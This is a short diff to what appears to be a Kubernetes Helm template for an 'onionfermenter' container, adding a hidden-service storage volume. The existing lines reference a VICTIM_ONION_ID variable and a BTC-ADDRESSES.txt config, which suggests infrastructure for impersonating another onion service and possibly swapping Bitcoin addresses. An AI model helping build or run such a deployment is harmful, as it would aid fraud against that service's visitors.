@@ -20,6 +20,8 @@ spec:
             - name: VICTIM_ONION_ID
               value: {{ .Values.victimOnionId }}
           volumeMounts:
+            - mountPath: /var/lib/hidden_service
+              name: hidden-service-volume
             - name: config-volume
               mountPath: /onionfermenter/BTC-ADDRESSES.txt
               subPath: BTC-ADDRESSES.txt
@@ -44,6 +46,9 @@ spec:
             failureThreshold: 5
             timeoutSeconds: 60
       volumes:
+        - name: hidden-service-volume
+          emptyDir:
+            sizeLimit: 10Mi
         - name: config-volume
           configMap:
             name: btc-addresses
